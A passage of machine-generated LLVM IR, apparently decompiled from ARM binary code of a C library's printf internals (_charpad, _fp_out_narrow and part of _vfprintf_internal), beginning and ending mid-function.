  %v0_f53c.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_f540.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb25

bb25:                                             ; preds = %.preheader, %dec_label_pc_f560
  %v2_f540 = phi i32 [ %v2_f540.pre, %.preheader ], [ %v1_f564, %dec_label_pc_f560 ]
  %v0_f53c = phi i32 [ %v0_f53c.pre, %.preheader ], [ %v1_f54c, %dec_label_pc_f560 ]
  %v1_f53c = inttoptr i32 %v0_f53c to i8*
  %v2_f53c = load i8, i8* %v1_f53c, align 1
  %v3_f53c = zext i8 %v2_f53c to i32
  store i32 %v3_f53c, i32* %r3.global-to-local, align 4
  %v3_f540 = inttoptr i32 %v2_f540 to i8*
  store i8 %v2_f53c, i8* %v3_f540, align 1
  %v0_f544 = load i32, i32* %r0.global-to-local, align 4
  %v1_f544 = inttoptr i32 %v0_f544 to i8*
  %v2_f544 = load i8, i8* %v1_f544, align 1
  %v3_f544 = zext i8 %v2_f544 to i32
  store i32 %v3_f544, i32* %r3.global-to-local, align 4
  %v7_f548 = icmp eq i8 %v2_f544, 10
  store i1 %v7_f548, i1* %cpsr_z.global-to-local, align 1
  %v0_f54c = load i32, i32* %r7.global-to-local, align 4
  %v1_f54c = add i32 %v0_f54c, 1
  store i32 %v1_f54c, i32* %r7.global-to-local, align 4
  br i1 %v7_f548, label %dec_label_pc_f554, label %dec_label_pc_f560

dec_label_pc_f554:                                ; preds = %bb25
  %v0_f554 = load i32, i32* @r4, align 4
  %v1_f554 = add i32 %v0_f554, 1
  %v2_f554 = inttoptr i32 %v1_f554 to i8*
  %v3_f554 = load i8, i8* %v2_f554, align 1
  %v4_f554 = zext i8 %v3_f554 to i32
  store i32 %v4_f554, i32* %r3.global-to-local, align 4
  %tmp30 = urem i8 %v3_f554, 2
  %v2_f558 = icmp eq i8 %tmp30, 0
  store i1 %v2_f558, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f558, label %dec_label_pc_f560, label %dec_label_pc_f56c

dec_label_pc_f560:                                ; preds = %dec_label_pc_f554, %bb25
  %v0_f560 = load i32, i32* %r6.global-to-local, align 4
  %v1_f560 = add i32 %v0_f560, -1
  store i32 %v1_f560, i32* %r6.global-to-local, align 4
  %v7_f560 = icmp eq i32 %v0_f560, 1
  store i1 %v7_f560, i1* %cpsr_z.global-to-local, align 1
  %v1_f564 = add i32 %v0_f544, 1
  store i32 %v1_f564, i32* %r0.global-to-local, align 4
  br i1 %v7_f560, label %dec_label_pc_f560.dec_label_pc_f56c_crit_edge, label %bb25

dec_label_pc_f560.dec_label_pc_f56c_crit_edge:    ; preds = %dec_label_pc_f560
  %v0_f56c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_f56c

dec_label_pc_f56c:                                ; preds = %dec_label_pc_f554, %dec_label_pc_f560.dec_label_pc_f56c_crit_edge
  %v0_f570 = phi i32 [ %v1_f564, %dec_label_pc_f560.dec_label_pc_f56c_crit_edge ], [ %v0_f544, %dec_label_pc_f554 ]
  %v0_f56c = phi i32 [ %v0_f56c.pre, %dec_label_pc_f560.dec_label_pc_f56c_crit_edge ], [ %v0_f554, %dec_label_pc_f554 ]
  %v1_f56c = add i32 %v0_f56c, 8
  %v2_f56c = inttoptr i32 %v1_f56c to i32*
  %v3_f56c = load i32, i32* %v2_f56c, align 4
  store i32 %v3_f56c, i32* %r3.global-to-local, align 4
  %v2_f570 = add i32 %v0_f56c, 16
  %v3_f570 = inttoptr i32 %v2_f570 to i32*
  store i32 %v0_f570, i32* %v3_f570, align 4
  %v0_f574 = load i32, i32* %r3.global-to-local, align 4
  %v1_f574 = load i32, i32* %r0.global-to-local, align 4
  %v2_f574 = sub i32 %v1_f574, %v0_f574
  store i32 %v2_f574, i32* %r3.global-to-local, align 4
  %v1_f578 = load i32, i32* %r5.global-to-local, align 4
  %v2_f578 = sub i32 %v1_f578, %v2_f574
  store i32 %v2_f578, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_f57c

dec_label_pc_f57c:                                ; preds = %dec_label_pc_f510.dec_label_pc_f57c_crit_edge, %dec_label_pc_f56c
  %v0_f57c = phi i32 [ %v0_f57c.pre, %dec_label_pc_f510.dec_label_pc_f57c_crit_edge ], [ %v2_f578, %dec_label_pc_f56c ]
  %v1_f57c = load i32, i32* %r8.global-to-local, align 4
  %v2_f57c = sub i32 %v1_f57c, %v0_f57c
  store i32 %v2_f57c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_f580

dec_label_pc_f4e0.dec_label_pc_f580.loopexit_crit_edge: ; preds = %dec_label_pc_f4e0thread-pre-split
  %v0_f580.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_f580

dec_label_pc_f580:                                ; preds = %entry, %dec_label_pc_f4e0.dec_label_pc_f580.loopexit_crit_edge, %dec_label_pc_f57c
  %v0_f580 = phi i32 [ %v2_f57c, %dec_label_pc_f57c ], [ %v0_f580.pre.pre, %dec_label_pc_f4e0.dec_label_pc_f580.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_f580, i32* %r0.global-to-local, align 4
  ret i32 %v0_f580

; uselistorder directives
  uselistorder i32 %v0_f580, { 1, 0 }
  uselistorder i32 %v0_f56c, { 1, 0 }
  uselistorder i32 %v1_f564, { 0, 2, 1 }
  uselistorder i32 %v0_f560, { 1, 0 }
  uselistorder i1 %v2_f558, { 1, 0 }
  uselistorder i32 %v1_f54c, { 1, 0 }
  uselistorder i32 %v0_f534, { 1, 0, 2 }
  uselistorder i32 %v5_f518, { 1, 0 }
  uselistorder i32 %v2_f518, { 1, 0, 2 }
  uselistorder i32 %v0_f500, { 1, 0 }
  uselistorder i32 %v4_f4f8, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v5_f508, { 0, 2, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 5, 4, 1, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 9, 8, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_f580, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f57c, { 1, 0 }
  uselistorder label %dec_label_pc_f56c, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_f4ec, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v3_f588 = load i32, i32* @r4, align 4
  %v6_f588 = load i32, i32* @r5, align 4
  %v9_f588 = load i32, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg3, i32* @r4, align 4
  store i8 %arg2, i8* %stack_var_-17, align 1
  %v2_f5a82 = icmp eq i32 %arg3, 0
  %v2_f5ac = ptrtoint i8* %stack_var_-17 to i32
  br i1 %v2_f5a82, label %dec_label_pc_f5c8, label %dec_label_pc_f5bc

dec_label_pc_f5a4:                                ; preds = %dec_label_pc_f5bc
  %v1_f5a4 = add i32 %v0_f5a4, -1
  store i32 %v1_f5a4, i32* @r4, align 4
  %v2_f5a8 = icmp eq i32 %v1_f5a4, 0
  %v0_f5b4 = load i32, i32* @r6, align 4
  br i1 %v2_f5a8, label %dec_label_pc_f5c8.loopexit, label %dec_label_pc_f5bc

dec_label_pc_f5bc:                                ; preds = %entry, %dec_label_pc_f5a4
  %v0_f5b44 = phi i32 [ %v0_f5b4, %dec_label_pc_f5a4 ], [ %arg1, %entry ]
  %v3_f5bc = call i32 @__stdio_fwrite(i32 %v2_f5ac, i32 1, i32 %v0_f5b44)
  %v7_f5c0 = icmp eq i32 %v3_f5bc, 1
  %v0_f5a4 = load i32, i32* @r4, align 4
  br i1 %v7_f5c0, label %dec_label_pc_f5a4, label %dec_label_pc_f5c8.loopexit

dec_label_pc_f5c8.loopexit:                       ; preds = %dec_label_pc_f5a4, %dec_label_pc_f5bc
  %v0_f5c8.ph = phi i32 [ %v0_f5a4, %dec_label_pc_f5bc ], [ 0, %dec_label_pc_f5a4 ]
  %v1_f5c8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_f5c8

dec_label_pc_f5c8:                                ; preds = %dec_label_pc_f5c8.loopexit, %entry
  %v1_f5c8 = phi i32 [ 0, %entry ], [ %v1_f5c8.pre, %dec_label_pc_f5c8.loopexit ]
  %v0_f5c8 = phi i32 [ 0, %entry ], [ %v0_f5c8.ph, %dec_label_pc_f5c8.loopexit ]
  %v2_f5c8 = sub i32 %v1_f5c8, %v0_f5c8
  store i32 %v3_f588, i32* @r4, align 4
  store i32 %v6_f588, i32* @r5, align 4
  store i32 %v9_f588, i32* @r6, align 4
  ret i32 %v2_f5c8

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_f5c8.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_f5bc, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_f5d4 = load i32, i32* @r4, align 4
  store i32 %v3_f5d4, i32* %stack_var_-24, align 4
  %v9_f5d4 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_f5dc = and i32 %arg2, 128
  %v2_f5dc = icmp eq i32 %v1_f5dc, 0
  %v0_f5e0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f5e0, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_f5dc, label %bb, label %dec_label_pc_f5f4

bb:                                               ; preds = %entry
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_f634

dec_label_pc_f5f4:                                ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_f5f8 = call i32 @strlen(i8* %arg4)
  store i32 %v3_f5f8, i32* %r0.global-to-local, align 4
  %v1_f5fc = load i32, i32* %r4.global-to-local, align 4
  %v2_f5fc = sub i32 %v1_f5fc, %v3_f5f8
  store i32 %v2_f5fc, i32* @r4, align 4
  store i32 %v3_f5f8, i32* @r5, align 4
  %tmp16 = icmp slt i32 %v2_f5fc, 1
  br i1 %tmp16, label %.thread, label %dec_label_pc_f614

.thread:                                          ; preds = %dec_label_pc_f5f4
  store i32 %v3_f5f8, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_f634

dec_label_pc_f614:                                ; preds = %dec_label_pc_f5f4
  %v0_f614 = load i32, i32* @r6, align 4
  %v1_f614 = urem i32 %v0_f614, 128
  %v0_f618 = load i32, i32* @r8, align 4
  store i32 %v0_f618, i32* %r0.global-to-local, align 4
  %v3_f620 = trunc i32 %v1_f614 to i8
  %v4_f620 = call i32 @_charpad(i32 %v0_f618, i8 %v3_f620, i32 %v2_f5fc)
  store i32 %v4_f620, i32* %r0.global-to-local, align 4
  %v1_f624 = load i32, i32* @r4, align 4
  %v9_f624 = icmp eq i32 %v4_f620, %v1_f624
  store i32 %v4_f620, i32* %r6.global-to-local, align 4
  br i1 %v9_f624, label %dec_label_pc_f630, label %dec_label_pc_f650

dec_label_pc_f630:                                ; preds = %dec_label_pc_f614
  %v0_f630 = load i32, i32* @r5, align 4
  store i32 %v0_f630, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f634

dec_label_pc_f634:                                ; preds = %bb, %.thread, %dec_label_pc_f630
  %v5_f640 = phi i32 [ %v0_f630, %dec_label_pc_f630 ], [ %arg3, %bb ], [ %v3_f5f8, %.thread ]
  %tmp17 = icmp slt i32 %v5_f640, 1
  br i1 %tmp17, label %.thread8, label %bb18

.thread8:                                         ; preds = %dec_label_pc_f634
  br label %bb19

bb18:                                             ; preds = %dec_label_pc_f634
  %v5_f63c = load i32, i32* @r7, align 4
  br label %bb19

bb19:                                             ; preds = %.thread8, %bb18
  %storemerge = phi i32 [ 0, %.thread8 ], [ %v5_f63c, %bb18 ]
  %tmp20 = phi i1 [ false, %.thread8 ], [ true, %bb18 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp20, i32 ptrtoint (i32* @global_var_10b90.351 to i32))
  %v0_f64c = load i32, i32* %r6.global-to-local, align 4
  %v2_f64c = add i32 %storemerge, %v0_f64c
  store i32 %v2_f64c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_f650

dec_label_pc_f650:                                ; preds = %dec_label_pc_f614, %bb19
  %v0_f650 = phi i32 [ %v4_f620, %dec_label_pc_f614 ], [ %v2_f64c, %bb19 ]
  store i32 %v0_f650, i32* %r0.global-to-local, align 4
  %v2_f654 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_f654, i32* %r4.global-to-local, align 4
  store i32 %v9_f5d4, i32* %r6.global-to-local, align 4
  ret i32 %v0_f650

; uselistorder directives
  uselistorder i32 %v0_f650, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 6, 7, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_f650, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_f634, { 2, 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp97 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i8 @__decompiler_undefined_function_2()
  %tmp100 = call i32 @__decompiler_undefined_function_0()
  %tmp101 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i32 @__decompiler_undefined_function_0()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i8 @__decompiler_undefined_function_2()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_f658 = load i32, i32* @r4, align 4
  store i32 %v3_f658, i32* %stack_var_-36, align 4
  %v6_f658 = load i32, i32* @r5, align 4
  %v15_f658 = load i32, i32* @r8, align 4
  %v18_f658 = load i32, i32* @sb, align 4
  %v21_f658 = load i32, i32* @sl, align 4
  %v24_f658 = load i32, i32* @fp, align 4
  %v2_f660 = ptrtoint i32* %stack_var_-332 to i32
  store i32 %v2_f660, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_f660, i32* %r0.global-to-local, align 4
  %v0_f66c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_f66c, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_f674 = call i32 @_ppfs_init(i32* nonnull %stack_var_-332)
  store i32 %v2_f674, i32* %r0.global-to-local, align 4
  %v1_f678 = icmp slt i32 %v2_f674, 0
  br i1 %v1_f678, label %dec_label_pc_f680, label %dec_label_pc_f6b4

dec_label_pc_f680:                                ; preds = %entry
  %v3_f680 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_f680, i32* @r4, align 4
  %v1_f684 = inttoptr i32 %v3_f680 to i8*
  store i32 %v3_f680, i32* %r0.global-to-local, align 4
  %v3_f688 = call i32 @strlen(i8* %v1_f684)
  store i32 %v3_f688, i32* %r0.global-to-local, align 4
  %v2_f68c = icmp eq i32 %v3_f688, 0
  br i1 %v2_f68c, label %bb, label %dec_label_pc_f69c

bb:                                               ; preds = %dec_label_pc_f680
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fc2c

dec_label_pc_f69c:                                ; preds = %dec_label_pc_f680
  %v0_f69c = load i32, i32* @r4, align 4
  store i32 %v0_f69c, i32* %r0.global-to-local, align 4
  %v0_f6a0 = load i32, i32* @fp, align 4
  store i32 %v0_f6a0, i32* %r2.global-to-local, align 4
  %v3_f6a4 = call i32 @__stdio_fwrite(i32 %v0_f69c, i32 %v3_f688, i32 %v0_f6a0)
  store i32 %v3_f6a4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fc2c

dec_label_pc_f6b4:                                ; preds = %entry
  store i32 %v2_f660, i32* %r0.global-to-local, align 4
  %v0_f6b8 = load i32, i32* @r5, align 4
  %v2_f6bc = call i32 @_ppfs_prepargs(i32 %v2_f660, i32 %v0_f6b8)
  store i32 %v2_f6bc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v4_f75c = zext i8 %tmp104 to i32
  %v2_f764 = ptrtoint i32* %stack_var_-252 to i32
  %v2_f784 = ptrtoint i32* %stack_var_-36 to i32
  %v2_f79c = icmp eq i32 %tmp102, 0
  %v1_f7b0 = inttoptr i32 %tmp101 to i32*
  %v2_faa0 = ptrtoint i32* %stack_var_-180 to i32
  %v2_f9bc = ptrtoint i32* %stack_var_-44 to i32
  %v2_f9d0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_f96c = add i32 %tmp101, 4
  %v4_f96c = inttoptr i32 %v3_f96c to i32*
  %v2_f970 = ptrtoint i32* %stack_var_-328 to i32
  %v7_f830 = zext i8 %tmp99 to i32
  %v2_f86c = ptrtoint i32* %stack_var_-53 to i32
  %v5_f874 = bitcast i32* %stack_var_-53 to i8*
  %v2_f87c = icmp ugt i32 %tmp102, 4
  %v7_f87c = icmp eq i32 %tmp102, 5
  %v0_fc14.pre = load i32, i32* @r4, align 4
  %tmp132 = icmp slt i32 %tmp105, 1
  %v5_f794187 = icmp sgt i32 %tmp103, 0
  %tmp195 = icmp ugt i32 %tmp102, 7
  %tmp196 = icmp ugt i32 %tmp102, 15
  %v2_f990 = icmp ugt i32 %tmp102, 16
  %v7_f990 = icmp eq i32 %tmp102, 17
  %v2_f994 = xor i1 %v7_f990, true
  %v3_f994 = and i1 %v2_f990, %v2_f994
  %v2_fa30 = icmp ugt i32 %tmp102, 18
  %v7_fa30 = icmp eq i32 %tmp102, 19
  %v2_fa34 = xor i1 %v7_fa30, true
  %v3_fa34 = and i1 %v2_fa30, %v2_fa34
  %v7_fa94 = icmp eq i32 %tmp102, 20
  %v2_f7d4 = add i32 %tmp102, ptrtoint (i32* @global_var_1288c.353 to i32)
  %v1_f7d8 = add i32 %tmp102, add (i32 ptrtoint (i32* @global_var_1288c.353 to i32), i32 -1)
  %v2_f7d8 = inttoptr i32 %v1_f7d8 to i8*
  %v2_f804 = xor i1 %v7_f87c, true
  %v3_f804 = and i1 %v2_f87c, %v2_f804
  %v7_f838 = icmp eq i32 %tmp102, 1
  %v2_f884 = xor i1 %v2_f87c, true
  %v3_f884 = or i1 %v7_f87c, %v2_f884
  %tmp197 = icmp ult i32 %tmp102, 3
  %v7_f8ec = icmp eq i32 %tmp102, 3
  %v11_f8f8 = icmp eq i32 %tmp102, 4
  %v9_f768 = mul nuw nsw i32 %v4_f75c, 8
  %v10_f768 = add nsw i32 %v9_f768, -8
  %v6_f770 = add i32 %v10_f768, %v2_f764
  br label %dec_label_pc_fc14

bb126:                                            ; preds = %dec_label_pc_f6cc.outer, %.thread7
  %v2_f6cc185 = phi i8 [ %v2_f6cc, %.thread7 ], [ %v2_f6cc181, %dec_label_pc_f6cc.outer ]
  %v1_f6e0184 = phi i32 [ %v2_f6e0, %.thread7 ], [ %v0_f6cc49, %dec_label_pc_f6cc.outer ]
  %v8_f6d4 = icmp eq i8 %v2_f6cc185, 37
  br i1 %v8_f6d4, label %dec_label_pc_f6e8, label %.thread7

.thread7:                                         ; preds = %bb126
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_f6e0 = add i32 %v1_f6e0184, 1
  store i32 %v2_f6e0, i32* @r4, align 4
  %v1_f6cc = inttoptr i32 %v2_f6e0 to i8*
  %v2_f6cc = load i8, i8* %v1_f6cc, align 1
  %v3_f6cc = zext i8 %v2_f6cc to i32
  store i32 %v3_f6cc, i32* %r3.global-to-local, align 4
  %v2_f6d0 = icmp eq i8 %v2_f6cc, 0
  br i1 %v2_f6d0, label %dec_label_pc_f6e8, label %bb126

dec_label_pc_f6e8:                                ; preds = %bb126, %.thread7, %dec_label_pc_f6cc.outer
  %v1_f6e0.lcssa = phi i32 [ %v0_f6cc49, %dec_label_pc_f6cc.outer ], [ %v2_f6e0, %.thread7 ], [ %v1_f6e0184, %bb126 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_f6e8 = sub i32 %v1_f6e0.lcssa, %v5_f6f8
  %v9_f6e8 = icmp eq i32 %v1_f6e0.lcssa, %v5_f6f8
  br i1 %v9_f6e8, label %dec_label_pc_f71c, label %dec_label_pc_f6f0

dec_label_pc_f6f0:                                ; preds = %dec_label_pc_f6e8
  store i32 %v2_f6e8, i32* @r5, align 4
  %tmp128 = icmp slt i32 %v2_f6e8, 1
  br i1 %tmp128, label %bb130, label %bb129

bb129:                                            ; preds = %dec_label_pc_f6f0
  store i32 %v5_f6f8, i32* %r0.global-to-local, align 4
  %v5_f700 = load i32, i32* @fp, align 4
  store i32 %v5_f700, i32* %r2.global-to-local, align 4
  br label %bb130

bb130:                                            ; preds = %dec_label_pc_f6f0, %bb129
  %tmp131 = phi i1 [ true, %bb129 ], [ false, %dec_label_pc_f6f0 ]
  call void @__pseudo_cond_branch(i1 %tmp131, i32 ptrtoint (i32* @global_var_10b90.351 to i32))
  %v0_f708 = load i32, i32* %r0.global-to-local, align 4
  %v1_f708 = load i32, i32* @r5, align 4
  %v9_f708 = icmp eq i32 %v0_f708, %v1_f708
  br i1 %v9_f708, label %dec_label_pc_f710, label %dec_label_pc_fc24

dec_label_pc_f710:                                ; preds = %bb130
  %v2_f714 = add i32 %v0_f708, %stack_var_-336.1.ph
  %v0_f71c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_f71c

dec_label_pc_f71c:                                ; preds = %dec_label_pc_f6e8, %dec_label_pc_f710
  %v0_f730 = phi i32 [ %v5_f6f8, %dec_label_pc_f6e8 ], [ %v0_f71c.pre, %dec_label_pc_f710 ]
  %stack_var_-336.2 = phi i32 [ %stack_var_-336.1.ph, %dec_label_pc_f6e8 ], [ %v2_f714, %dec_label_pc_f710 ]
  %v1_f71c = inttoptr i32 %v0_f730 to i8*
  %v2_f71c = load i8, i8* %v1_f71c, align 1
  %v3_f71c = zext i8 %v2_f71c to i32
  store i32 %v3_f71c, i32* %r3.global-to-local, align 4
  %v2_f720 = icmp eq i8 %v2_f71c, 0
  br i1 %v2_f720, label %dec_label_pc_fc2c, label %dec_label_pc_f728

dec_label_pc_f728:                                ; preds = %dec_label_pc_f71c
  %v1_f728 = add i32 %v0_f730, 1
  %v2_f728 = inttoptr i32 %v1_f728 to i8*
  %v3_f728 = load i8, i8* %v2_f728, align 1
  %v4_f728 = zext i8 %v3_f728 to i32
  store i32 %v4_f728, i32* %r3.global-to-local, align 4
  %v7_f72c = icmp eq i8 %v3_f728, 37
  store i32 %v1_f728, i32* %r2.global-to-local, align 4
  br i1 %v7_f72c, label %dec_label_pc_fc1c, label %dec_label_pc_f738

dec_label_pc_f738:                                ; preds = %dec_label_pc_f728
  store i32 %v2_f660, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_f660, i32* %r0.global-to-local, align 4
  store i32 %v1_f728, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_f74c = call i32 @_ppfs_parsespec(i32* nonnull %stack_var_-332)
  store i32 %v2_f660, i32* @r0, align 4
  %v0_f754 = call i32 @_ppfs_setargs()
  store i32 %v0_f754, i32* %r0.global-to-local, align 4
  store i32 %v4_f75c, i32* %ip.global-to-local, align 4
  store i32 %v2_f764, i32* %r3.global-to-local, align 4
  br i1 %tmp132, label %.thread, label %bb133

.thread:                                          ; preds = %dec_label_pc_f738
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  br label %bb134

bb133:                                            ; preds = %dec_label_pc_f738
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  store i32 %v6_f770, i32* %r3.global-to-local, align 4
  br label %bb134

bb134:                                            ; preds = %.thread, %bb133
  %v0_f77c78 = phi i32 [ %v6_f770, %bb133 ], [ %v2_f764, %.thread ]
  store i32 %v2_f784, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_f794187, label %dec_label_pc_f77c, label %dec_label_pc_f798

dec_label_pc_f77c:                                ; preds = %bb134, %dec_label_pc_f77c
  %v5_f78c189 = phi i32 [ %v5_f78c, %dec_label_pc_f77c ], [ %v2_f784, %bb134 ]
  %v0_f77c188 = phi i32 [ %v1_f780, %dec_label_pc_f77c ], [ %v0_f77c78, %bb134 ]
  %v2_f77c = add i32 %v5_f78c189, -4
  %v3_f77c = inttoptr i32 %v2_f77c to i32*
  store i32 %v0_f77c188, i32* %v3_f77c, align 4
  %v0_f780 = load i32, i32* %r3.global-to-local, align 4
  %v1_f780 = add i32 %v0_f780, 8
  store i32 %v1_f780, i32* %r3.global-to-local, align 4
  %v0_f788.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_f788.pre = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_f784, i32* @lr, align 4
  %v4_f78c = mul i32 %v0_f788.pre, 4
  %v5_f78c = add i32 %v4_f78c, %v2_f784
  %v1_f790 = add i32 %v0_f788.pre, 1
  store i32 %v1_f790, i32* %r2.global-to-local, align 4
  %v5_f794 = icmp slt i32 %v0_f788.pre, %v1_f788.pre
  br i1 %v5_f794, label %dec_label_pc_f77c, label %dec_label_pc_f798

dec_label_pc_f798:                                ; preds = %dec_label_pc_f77c, %bb134
  store i32 %tmp102, i32* %r2.global-to-local, align 4
  br i1 %v2_f79c, label %dec_label_pc_f7a4, label %dec_label_pc_f7c8

dec_label_pc_f7a4:                                ; preds = %dec_label_pc_f798
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-336.2, i32* %ip.global-to-local, align 4
  %v2_f7b0 = load i32, i32* %v1_f7b0, align 4
  store i32 %v2_f7b0, i32* %r0.global-to-local, align 4
  %v1_f7b4 = and i32 %v0_f7f8, 3840
  store i32 %stack_var_-336.2, i32* %r2.global-to-local, align 4
  %v3_f7bc = ashr i32 %stack_var_-336.2, 31
  store i32 %v3_f7bc, i32* %r3.global-to-local, align 4
  %v4_f7c0 = inttoptr i32 %v2_f7b0 to i8*
  %v5_f7c0 = call i32 @_store_inttype(i8* %v4_f7c0, i32 %v1_f7b4, i32 %stack_var_-336.2, i32 %v3_f7bc)
  store i32 %v5_f7c0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fc10

dec_label_pc_f7c8:                                ; preds = %dec_label_pc_f798
  br i1 %tmp195, label %dec_label_pc_f954, label %dec_label_pc_f7d0

dec_label_pc_f7d0:                                ; preds = %dec_label_pc_f7c8
  store i32 %v2_f7d4, i32* %r3.global-to-local, align 4
  %v3_f7d8 = load i8, i8* %v2_f7d8, align 1
  %v4_f7d8 = zext i8 %v3_f7d8 to i32
  store i32 %v4_f7d8, i32* @r4, align 4
  %v7_f7dc = icmp eq i8 %v3_f7d8, 10
  br i1 %v7_f7dc, label %dec_label_pc_f7e8, label %bb135

bb135:                                            ; preds = %dec_label_pc_f7d0
  store i32 87, i32* @r5, align 4
  br label %bb139

dec_label_pc_f7e8:                                ; preds = %dec_label_pc_f7d0
  store i32 %v0_f7f8, i32* %r3.global-to-local, align 4
  %v1_f7ec = and i32 %v0_f7f8, 32
  %v2_f7ec = icmp eq i32 %v1_f7ec, 0
  %.175 = select i1 %v2_f7ec, i32 87, i32 44
  store i32 %.175, i32* @r5, align 4
  %v1_f7f8 = and i32 %v0_f7f8, 64
  %v2_f7f8 = icmp eq i32 %v1_f7f8, 0
  br i1 %v2_f7f8, label %bb139, label %bb138

bb138:                                            ; preds = %dec_label_pc_f7e8
  %.176 = select i1 %v2_f7ec, i32 215, i32 172
  store i32 %.176, i32* @r5, align 4
  br label %bb139

bb139:                                            ; preds = %bb135, %dec_label_pc_f7e8, %bb138
  br i1 %v3_f804, label %.thread84, label %dec_label_pc_f80c

.thread84:                                        ; preds = %bb139
  %v5_f804 = sub nsw i32 0, %v4_f7d8
  store i32 %v5_f804, i32* @r4, align 4
  br label %dec_label_pc_f824

dec_label_pc_f80c:                                ; preds = %bb139
